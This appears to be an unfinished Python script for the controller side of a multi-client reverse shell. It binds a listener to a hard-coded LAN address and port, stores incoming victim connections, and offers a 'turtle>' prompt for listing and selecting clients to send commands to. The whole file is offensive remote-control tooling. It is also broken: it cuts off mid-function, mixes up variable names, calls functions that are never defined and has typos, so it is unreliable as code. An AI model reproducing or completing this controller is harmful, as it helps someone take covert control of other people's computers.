import socket
import sys
import threading 
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connection = []
all_address = []

# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = '192.168.1.72'
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()



# Handling connection from multiple clients and saving to a list 
# Closing Previous connection when server.py file is restarted 


def accepting_connection():
    
    for c in all_connection:
        c.close()
    
    del all_connection[:]
    del all_address[:]

    
    # Making a Server Persistent 
    while True:

        try:
            conn, address = s.accept()
            s.setblocking(1) # Prevent Timeout


            all_connection.append(conn)
            all_address.append(address)

            print('Connection has been established ' + address[0])

        except:
            print("Error Accepting the connection")


# 2nd Thread function -> See all the Client.. Send command to the client 
# Creating a Shell
# turtle> lsit
# 0 FriendA
# 1 FriendB
# 2 FriendC

def start_turtle():

    cmd = input('turtle>')
    if cmd == 'list':
        list_connection()

    # Checking if select is in command Line
    elif 'select' in cmd:
        con = get_target(cmd)
        if conn is not None:
            send_target_command(conn)
    else:
        print('Command not Recognized')


# Display all the current active connection with the client
def list_connection():
    results = ''

    selectId = 0 
    for i, conn in enumerate(all_connection):
        try:    
            conn.send(str.encode(''))
            conn.recv(201480)
        
        except:
            # delete the specific connection  
            del all_connection[i]
            del all_address[i]
            continue
        
        results = str(i) + "  " + str(all_address[i][0]) +  "  " + str(all_address[i][1])  + "\n"

        








        






    






        






        





